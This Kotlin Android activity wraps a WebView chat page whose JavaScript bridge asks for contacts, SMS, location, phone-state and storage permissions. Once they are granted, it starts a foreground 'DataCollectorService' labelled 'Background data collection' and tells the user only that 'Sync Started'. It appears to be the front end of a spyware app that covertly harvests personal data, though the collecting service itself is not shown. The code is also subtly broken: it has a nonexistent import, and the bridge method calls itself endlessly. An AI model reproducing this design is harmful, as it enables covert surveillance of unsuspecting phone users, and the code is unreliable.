package com.example.myapp

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.webkit.WebViewCompat
import com.google.android.webkit.WebViewImpl

class MainActivity : AppCompatActivity() {

    private lateinit var webView: android.webkit.WebView
    private val PERMISSION_CODE = 101
    private val REQUIRED_PERMISSIONS = arrayOf(
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.RECEIVE_BOOT_COMPLETED
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Create WebView
        webView = android.webkit.WebView(this)
        setContentView(webView)
        
        // WebView Settings
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.loadUrl("file:///android_asset/index.html")
        
        // Add JavaScript Bridge
        webView.addJavascriptInterface(AndroidBridge(), "AndroidBridge")
        webView.webViewClient = android.webkit.WebViewClient()

        // Create Notification Channel (for Android 8.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("SYNC_CHANNEL", "Data Sync", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Background data collection"
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    // Function called from JavaScript
    fun requestPermissions() {
        val permissionsToRequest = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_CODE)
        } else {
            showToast("✅ Permissions Already Granted!")
            startService()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                showToast("✅ All Permissions Granted! Starting Sync...")
                webView.evaluateJavascript("javascript:document.getElementById('chat').innerHTML += '<div class=\"msg user\">Sync Started! 🚀</div>'", null)
                startService()
            } else {
                showToast("❌ Some permissions denied.")
            }
        }
    }

    private fun startService() {
        val intent = android.content.Intent(this, DataCollectorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    // JavaScript Interface Class
    inner class AndroidBridge {
        @android.webkit.JavascriptInterface
        fun requestPermissions() {
            requestPermissions()
        }
    }
}